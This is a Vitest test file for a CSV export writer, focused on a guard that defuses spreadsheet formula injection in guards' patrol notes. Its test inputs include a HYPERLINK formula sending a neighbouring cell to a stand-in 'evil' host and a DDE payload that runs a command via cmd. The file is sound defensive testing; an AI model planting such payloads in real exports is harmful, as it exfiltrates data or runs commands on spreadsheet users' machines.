import { describe, expect, it } from "vitest";

import { csvCell, csvDocument, csvRow } from "@/lib/export/csv";

/**
 * The CSV writer, and specifically the formula guard.
 *
 * This matters more than the quoting. Guards type free text that ends up in a
 * client's spreadsheet, and Excel and Sheets both execute a leading `=` on
 * open. `=HYPERLINK("http://x/"&A1,"click")` in a patrol note is a working
 * exfiltration of the row next to it, from an app whose whole promise is that
 * the log is trustworthy.
 */
describe("csvCell", () => {
  it("leaves ordinary text alone", () => {
    expect(csvCell("Front lobby clear")).toBe("Front lobby clear");
    expect(csvCell("Gate 3")).toBe("Gate 3");
  });

  it("quotes commas, quotes and newlines", () => {
    expect(csvCell("lobby, then gate")).toBe('"lobby, then gate"');
    expect(csvCell('he said "clear"')).toBe('"he said ""clear"""');
    expect(csvCell("line one\nline two")).toBe('"line one\nline two"');
  });

  it.each([
    ["=1+1", "'=1+1"],
    ['=HYPERLINK("http://evil/"&A1,"x")', '\'=HYPERLINK("http://evil/"&A1,"x")'],
    ["+1", "'+1"],
    ["-1", "'-1"],
    ["@SUM(A1)", "'@SUM(A1)"],
    ["\tsneaky", "'\tsneaky"],
    ["\rsneaky", "'\rsneaky"],
  ])("defuses a leading formula character: %s", (input, expectedPrefix) => {
    const out = csvCell(input);
    // The apostrophe must come first, before any quoting wrapper, or the
    // spreadsheet sees the formula character at position 0 and evaluates it.
    const unquoted = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
    expect(unquoted).toBe(expectedPrefix);
    expect(unquoted.startsWith("'")).toBe(true);
  });

  it("only guards the leading character, not every occurrence", () => {
    // "Gate 3 - north" is a sentence, not a formula. Escaping the interior
    // would corrupt ordinary text to buy nothing: a spreadsheet only
    // evaluates a cell that *starts* with one of these.
    expect(csvCell("Gate 3 - north")).toBe("Gate 3 - north");
    expect(csvCell("email me @ noon")).toBe("email me @ noon");
  });

  it("treats null and undefined as empty, not as the word", () => {
    expect(csvCell(null)).toBe("");
    expect(csvCell(undefined)).toBe("");
  });

  it("formats dates as ISO so a spreadsheet cannot reinterpret them", () => {
    const at = new Date("2026-03-01T07:30:00.000Z");
    expect(csvCell(at)).toBe("2026-03-01T07:30:00.000Z");
  });
});

describe("csvRow and csvDocument", () => {
  it("joins cells with commas and leaves the line ending to the document", () => {
    // `csvRow` is the join, `csvDocument` owns the terminator. Splitting it
    // that way means there is exactly one place that decides CRLF, so the
    // header and the body cannot end up with different line endings.
    expect(csvRow(["a", "b"])).toBe("a,b");
  });

  it("writes the header once, then a line per row", () => {
    const doc = csvDocument(
      ["name", "note"],
      [
        ["Ada", "all clear"],
        ["Grace", "gate, locked"],
      ],
    );
    expect(doc).toBe('name,note\r\nAda,all clear\r\nGrace,"gate, locked"\r\n');
  });

  it("carries the formula guard through the document, not only the cell", () => {
    // The guard has to survive the composition. A writer that escaped at the
    // cell level but joined raw strings elsewhere would pass the cell tests
    // above and still ship an executable file.
    const doc = csvDocument(["note"], [["=cmd|'/c calc'!A1"]]);
    expect(doc).toContain("'=cmd");
    expect(doc.split("\r\n")[1]?.startsWith("=")).toBe(false);
  });
});
